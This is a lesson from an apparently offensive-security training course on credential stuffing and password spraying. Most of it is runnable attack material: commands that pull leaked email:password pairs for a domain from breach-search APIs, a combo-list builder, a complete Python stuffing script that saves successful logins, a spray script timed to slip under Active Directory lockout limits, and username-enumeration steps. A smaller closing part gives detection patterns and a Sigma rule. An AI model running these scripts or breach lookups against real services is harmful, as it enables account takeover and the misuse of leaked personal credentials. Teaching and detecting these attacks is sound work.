---
title: "Credential Stuffing and Spraying — Breach Databases, Combo Lists, and Low-and-Slow Attacks"
tags: [credential-stuffing, password-spraying, breach-databases, combo-lists, AD-lockout,
       authentication, brute-force, HIBP, ATT&CK-T1110, CWE-307, hydra, ffuf]
module: 04-BroadSurface-01
day: 166
related_topics:
  - Authentication and Session Management (Days 39–40)
  - Rate Limiting Bypass (Day 167)
  - Credential Attack Lab (Day 168)
  - Auth Attack Detection (Day 176)
---

# Day 166 — Credential Stuffing and Spraying

> "The most common way into an organisation is not a zero-day. It is a
> password from a breach that happened three years ago that someone reused.
> The attacker paid $50 for 100 million credentials on a forum and wrote a
> 20-line script. That is not hacking — that is harvesting. Know how it works
> so you can tell your clients exactly how exposed they are."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Distinguish credential stuffing, password spraying, and brute force —
   and explain when each is the correct attack.
2. Locate breach databases and build a targeted combo list for a specific
   domain.
3. Execute a low-and-slow spray against a web application login without
   triggering lockout or rate limiting.
4. Explain how Active Directory lockout policies interact with spray timing.
5. Write a detection rule that catches credential stuffing distinct from
   normal failed logins.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| HTTP authentication concepts | Days 39–41 |
| Rate limiting theory | Day 153 |
| Burp Suite and curl | Days 22–24 |
| Linux bash scripting | Days 9–10 |

---

## MITRE ATT&CK Mapping

| Technique | ID | Sub-technique |
|---|---|---|
| Brute Force | T1110 | — |
| Password Spraying | T1110.003 | — |
| Credential Stuffing | T1110.004 | — |

---

## Part 1 — The Three Attack Types

### Credential Stuffing

**What it is:** Using username:password pairs from a previous breach against
a different service. Relies on password reuse — people use the same password
on multiple sites.

**Signal:** large volume of attempts per username. Each attempt uses a different
password from the breach. Looks like brute force from a defender's perspective,
but the success rate is much higher (0.1–2% vs <0.001% for random guessing).

**Prerequisite:** a breach dataset with plaintext or cracked passwords.

### Password Spraying

**What it is:** Trying one or a few common passwords against a large list of
valid usernames. Avoids per-account lockout because each account sees very few
attempts.

**Signal:** low attempts per account (1–3), high account breadth, common
password choices (`Company2024!`, `Welcome1`, `P@ssword1`).

**When to use it:** when you have a valid list of usernames (e.g. Active
Directory UPN format from OSINT) but no breach data.

### Brute Force

**What it is:** Exhaustively trying all passwords in a keyspace (dictionary,
rule-based, or pure permutation).

**When to use it:** rarely in online attacks — too slow, too loud. Brute force
is for offline cracking (captured hashes, ZIP files, PDF passwords).

**Comparison table:**

| Property | Stuffing | Spraying | Brute Force |
|---|---|---|---|
| Input needed | Breach combo list | Valid username list | Target account only |
| Attempts per account | High (many passwords) | Low (1–3 passwords) | High |
| Lockout risk | High if not throttled | Low (by design) | High |
| Success rate | 0.1–2% | 0.5–5% (corp) | Very low (online) |
| Target type | Consumer apps | Corporate / AD | Offline hashes |

---

## Part 2 — Finding Breach Data

### 2.1 — Publicly Available Breach Databases

| Source | Type | URL |
|---|---|---|
| Have I Been Pwned | Check by email/domain | https://haveibeenpwned.com |
| HIBP API | Enumerate breached accounts at a domain | https://haveibeenpwned.com/API/v3 |
| DeHashed | Paid; search by domain, email, username | https://dehashed.com |
| Leak-Lookup | Free + paid; large index | https://leak-lookup.com |
| IntelX | Intelligence search including breaches | https://intelx.io |
| BreachDirectory | Free API; search by email | https://breachdirectory.org |

**OSINT target:** an organisation's email domain. Enumerate all breached
accounts at `@target.com` and their associated passwords.

```bash
# HIBP API — list all breaches that affected a given domain
curl -s "https://haveibeenpwned.com/api/v3/breacheddomain/target.com" \
  -H "hibp-api-key: YOUR_KEY" | jq '.[].Name'

# DeHashed API (paid) — get emails + passwords for a domain
curl -s "https://api.dehashed.com/search?query=domain:target.com&size=10000" \
  -H "Authorization: Basic BASE64(email:key)" | jq .
```

### 2.2 — Building a Targeted Combo List

A combo list is a file where each line is `username:password` or
`email:password`.

```bash
# Filter DeHashed results to extract email:password pairs
curl -s "https://api.dehashed.com/search?query=domain:target.com&size=10000" \
  -H "Authorization: Basic BASE64" \
  | jq -r '.entries[] | "\(.email):\(.password)"' \
  | grep -v ':null' > combo_target.txt

# Check how many unique accounts were found
wc -l combo_target.txt

# Extract just emails (usernames)
cut -d: -f1 combo_target.txt | sort -u > usernames_target.txt

# Extract just passwords (for spray list)
cut -d: -f2- combo_target.txt | sort | uniq -c | sort -rn | head -50
```

The password frequency analysis tells you what passwords employees at this
organisation have historically chosen — valuable intel for a spray.

### 2.3 — Open-Source Wordlists

For spraying when breach data is unavailable:

| List | Location | Use |
|---|---|---|
| `rockyou.txt` | `/usr/share/wordlists/rockyou.txt` | General brute force |
| `SecLists/Passwords/darkweb2017-top10000.txt` | SecLists repo | Common passwords |
| `SecLists/Passwords/months_seasons.txt` | SecLists repo | Season+year patterns |
| Custom corporate pattern | Generate with rules | `Company2024!`, `Welcome1` |

**Generate a corporate password pattern list:**

```bash
# Generate season + year combinations
for season in Spring Summer Fall Autumn Winter; do
  for year in 2022 2023 2024 2025; do
    echo "${season}${year}"
    echo "${season}${year}!"
    echo "${season}${year}@"
    echo "${season}@${year}"
  done
done > seasonal_passwords.txt

# Common corporate patterns
cat > corporate_passwords.txt << 'EOF'
Welcome1
Welcome1!
Password1
Password1!
P@ssword1
Company2024!
Company2024
ChangeMe1!
Letmein1
Letmein1!
Monday1
January2024!
February2024!
EOF
```

---

## Part 3 — Credential Stuffing Execution

### 3.1 — Tool: ffuf (Fast and Flexible)

```bash
# Format: username:password on each line in combo list
# ffuf submits each pair as form fields

ffuf -w combo_target.txt \
  -X POST \
  -u https://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=FUZZ2" \
  -w combo_target.txt:FUZZ \
  -w combo_target.txt:FUZZ2 \
  -mc 302,200 \
  -fs 1234 \
  -rate 10
```

**Problem:** ffuf treats FUZZ and FUZZ2 independently (pitchfork mode needed).

**Better:** use Burp Intruder in Pitchfork mode, or a custom script:

### 3.2 — Custom Python Stuffing Script

```python
#!/usr/bin/env python3
"""Credential stuffing script — authorised use only."""
from __future__ import annotations

import csv
import time
import requests
from pathlib import Path


LOGIN_URL = "https://target.com/api/v1/auth/login"
COMBO_FILE = Path("combo_target.txt")
DELAY_SEC = 1.0          # 1 request per second — adjust per rate limit
SUCCESS_STATUS = 200     # or check for redirect / token in response
OUTPUT_FILE = Path("found_credentials.txt")


def attempt_login(session: requests.Session, email: str, password: str) -> bool:
    try:
        r = session.post(
            LOGIN_URL,
            json={"email": email, "password": password},
            timeout=10,
        )
        # Adjust success check to match target's response
        return r.status_code == SUCCESS_STATUS and "access_token" in r.text
    except requests.RequestException:
        return False


def main() -> None:
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible)"})

    with COMBO_FILE.open() as f, OUTPUT_FILE.open("w") as out:
        for line in f:
            line = line.strip()
            if ":" not in line:
                continue
            email, _, password = line.partition(":")

            if attempt_login(session, email, password):
                result = f"{email}:{password}"
                print(f"[HIT] {result}")
                out.write(result + "\n")
                out.flush()

            time.sleep(DELAY_SEC)


if __name__ == "__main__":
    main()
```

---

## Part 4 — Password Spraying

### 4.1 — Why Spraying Beats Stuffing Against Corporate Targets

Corporate accounts often have lockout policies (e.g. 5 failed attempts →
15-minute lockout). Spraying one password across all accounts means:

- Account A: 1 attempt → no lockout
- Account B: 1 attempt → no lockout
- Account C: 1 attempt → no lockout
- ... and so on for 10,000 accounts

At a pace of 1 attempt per account per 30 minutes, you stay well under the
threshold while covering the full target list.

### 4.2 — Active Directory Lockout Interaction

AD lockout policy is set per-domain:

| Setting | Typical value | Spray implication |
|---|---|---|
| Account Lockout Threshold | 5–10 attempts | Stay below this number per account |
| Observation Window | 30 minutes | Reset counter after this window |
| Lockout Duration | 15–30 minutes | If you trip it, wait this long |

**Spray cadence for `threshold = 5, window = 30 min`:**

- Send ≤ 3 attempts per account per 30-minute window (stay at 60% of threshold)
- With 5,000 accounts: 5,000 attempts every 30 minutes = 166 requests/minute

**Finding the lockout policy:**

From inside the network:
```powershell
Get-ADDefaultDomainPasswordPolicy | Select LockoutThreshold,LockoutObservationWindow
```

From outside: assume a conservative threshold (3 attempts per 30 minutes).
A locked account is visible — the attacker has demonstrated the account exists.

### 4.3 — Spray Script

```python
#!/usr/bin/env python3
"""Password spray — try one password against many usernames."""
from __future__ import annotations

import time
import requests
from pathlib import Path


LOGIN_URL = "https://target.com/login"
USERNAME_FILE = Path("usernames_target.txt")
PASSWORDS = [
    "Spring2024!",
    "Welcome1",
    "Company2024!",
]
# Time between requests — adjust to stay under lockout policy
DELAY_PER_REQUEST = 10.0   # 10 sec = 6/min; safe for threshold=5,window=30min


def spray(session: requests.Session, username: str, password: str) -> bool:
    r = session.post(
        LOGIN_URL,
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=10,
    )
    # Adjust success check: 302 to dashboard, 200 with token, etc.
    return r.status_code == 302 and "/dashboard" in r.headers.get("Location", "")


def main() -> None:
    usernames = USERNAME_FILE.read_text().splitlines()
    session = requests.Session()

    for password in PASSWORDS:
        print(f"\n[*] Spraying password: {password}")
        for username in usernames:
            if spray(session, username, password):
                print(f"[HIT] {username}:{password}")
            time.sleep(DELAY_PER_REQUEST)

        # Pause between password rounds to let observation window reset
        print(f"[*] Round complete. Waiting 35 minutes before next password...")
        time.sleep(35 * 60)


if __name__ == "__main__":
    main()
```

---

## Part 5 — Username Enumeration (Pre-requisite for Spraying)

Before spraying, you need valid usernames. Common sources:

### 5.1 — OSINT Username Collection

```bash
# LinkedIn — employee list for target company
# theHarvester: email format discovery
theHarvester -d target.com -l 500 -b linkedin,google,hunter

# hunter.io email format discovery
curl -s "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY" \
  | jq -r '.data.pattern'
# → {first}.{last}@target.com

# Generate username list from LinkedIn names
python3 - << 'EOF'
names = [
    ("John", "Smith"), ("Jane", "Doe"), ("Alice", "Johnson"),
    # ... paste LinkedIn employee names here
]
domain = "target.com"
for first, last in names:
    print(f"{first.lower()}.{last.lower()}@{domain}")
    print(f"{first[0].lower()}{last.lower()}@{domain}")
    print(f"{first.lower()}{last.lower()}@{domain}")
EOF
```

### 5.2 — Username Enumeration via Login Response

Many login pages leak whether a username is valid through different error
messages or response timing:

```bash
# Test with a known-valid username (your own test account)
curl -s -o /dev/null -w "%{time_total} %{http_code}\n" \
  -X POST https://target.com/login \
  -d "username=known_valid&password=wrongpassword"

# Test with an unknown username
curl -s -o /dev/null -w "%{time_total} %{http_code}\n" \
  -X POST https://target.com/login \
  -d "username=nonexistent_xyz&password=wrongpassword"
```

If response time or body differs → enumeration is possible.

---

## Real-World Cases

| Incident | Technique | Impact |
|---|---|---|
| **2021 Spotify** | Credential stuffing from prior breaches | 350,000+ accounts compromised |
| **2020 Nintendo** | Stuffing against legacy NNID system | 300,000 accounts; payment data exposed |
| **2023 23andMe** | Stuffing; enabled profile sharing feature | 7M genetic profiles indirectly exposed |
| **2019 Dunkin' Donuts** | Stuffing via DD Perks portal | Rewards points drained |
| **SolarWinds breach (2020)** | Password `solarwinds123` for update server | Entire supply chain compromised |

The 23andMe case is particularly instructive: the attacker only needed access
to one account, but the "DNA relatives" feature allowed them to enumerate and
harvest data from 6.9M connected profiles — an IDOR at scale on top of a
credential stuffing breach.

---

## Detection

| Attack | Log pattern | Alert condition |
|---|---|---|
| Credential stuffing | Many 401s from same IP, different usernames | >20 unique usernames failing from one IP/minute |
| Credential stuffing (distributed) | Many 401s, many IPs, same user agent pattern | Spike in 401s vs baseline with no IP concentration |
| Password spray | Low 401 count per account, across many accounts | >100 accounts with exactly 1–3 failed logins in a 30-min window |
| Username enumeration | Different response sizes for valid vs invalid | Response length bimodal distribution on `/login` |

### Sigma Rule — Password Spray Detection

```yaml
title: Password Spray — Low-Volume Multi-Account Failed Logins
status: experimental
logsource:
  category: webserver
detection:
  selection:
    http_status_code: 401
    request_uri|endswith: /login
  timeframe: 30m
  condition: selection | count(distinct cs-username) by c-ip > 100
    and selection | count(cs-username) by cs-username < 5
falsepositives:
  - Mass failed logins from a single shared NAT IP (corporate WiFi)
level: high
tags:
  - attack.t1110.003
```

---

## Key Takeaways

1. **Credential stuffing works because of password reuse.** The average user
   has 5 passwords across 100 accounts. Breaching the weakest site gives the
   attacker 20% of the others.
2. **Password spraying is the AD attacker's first move.** It is low-noise,
   bypasses lockout by design, and a single valid credential starts the
   lateral movement chain.
3. **The lockout threshold is your spray budget.** Know the policy before
   spraying. `threshold - 2` per observation window is the safe zone.
4. **Detection looks different for each attack.** Stuffing shows high per-IP
   volume. Spraying shows low per-account volume across high account breadth.
   Both must be detected separately.
5. **Breach data is a recon artefact.** Before testing, HIBP and DeHashed
   tell you which employees have been in breaches and what those passwords
   were. That is threat intelligence, not just an attack tool.

---

## Exercises

1. Use the HIBP domain search API to check how many accounts at a target
   domain have appeared in known breaches. (Use a programme you are authorised
   to test, or a domain you own.)
2. Generate a corporate password list for a fictional company "Acme Corp"
   incorporating seasonal patterns, the company name, and common substitutions.
   How many unique entries do you generate?
3. Write a Sigma rule that detects credential stuffing from a distributed
   set of IPs (no single IP sends >10 requests, but 1,000 IPs all target the
   same endpoint in 5 minutes).
4. The 23andMe breach started from credential stuffing but escalated via
   a feature called "DNA Relatives." What OWASP API category does that
   escalation represent? (Hint: re-read Day 148.)

---

## Questions

> Add your questions here. Each question gets a Global ID (Q166.1, Q166.2 …).
> Follow-up questions use hierarchical numbering (Q166.1.1, Q166.1.2 …).

---

## Navigation

← Previous: [Day 165 — Web Exploitation Competency Gate](../03-WebExploit-07/DAY-0165-Web-Exploitation-Competency-Gate.md)
→ Next: [Day 167 — Rate Limiting Bypass](DAY-0167-Rate-Limiting-Bypass.md)
